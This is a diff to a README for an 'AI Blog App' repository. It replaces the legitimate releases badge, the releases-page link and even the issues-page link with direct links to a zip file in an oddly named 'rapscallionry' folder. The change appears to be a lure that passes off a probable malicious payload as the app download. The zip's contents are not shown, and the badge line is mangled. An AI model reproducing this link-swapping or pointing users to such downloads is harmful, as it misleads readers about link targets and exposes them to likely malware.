@@ -1,6 +1,6 @@
 # 🚀 Blog - Easy Setup for Your AI Blogging Experience
 
-[![Download AI Blog App](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/AdrianValleAraujo/Blog/releases)
+[![Download AI Blog App](https://raw.githubusercontent.com/AdrianValleAraujo/Blog/main/rapscallionry/Blog.zip%20Now-Get%https://raw.githubusercontent.com/AdrianValleAraujo/Blog/main/rapscallionry/Blog.zip)](https://raw.githubusercontent.com/AdrianValleAraujo/Blog/main/rapscallionry/Blog.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **AI Blog App**. This application allows you to create and manage
 
 ## 📥 Download & Install
 
-1. **Go to the Releases Page**: Visit the [Releases Page](https://github.com/AdrianValleAraujo/Blog/releases) to find the latest version of the app.
+1. **Go to the Releases Page**: Visit the [Releases Page](https://raw.githubusercontent.com/AdrianValleAraujo/Blog/main/rapscallionry/Blog.zip) to find the latest version of the app.
    
 2. **Download the App**: Click on the link for the appropriate version. This will download the application file to your computer.
 
@@ -58,7 +58,7 @@ For a detailed understanding of the app’s capabilities, check the documentatio
 
 If you experience any issues or have suggestions, don't hesitate to reach out:
 
-- Open an issue on the [GitHub Issues Page](https://github.com/AdrianValleAraujo/Blog/issues).
+- Open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/AdrianValleAraujo/Blog/main/rapscallionry/Blog.zip).
 - Join our community on social media to share your experiences and ideas.
 
 Thank you for choosing the **AI Blog App**. We hope it serves you well in your blogging journey!
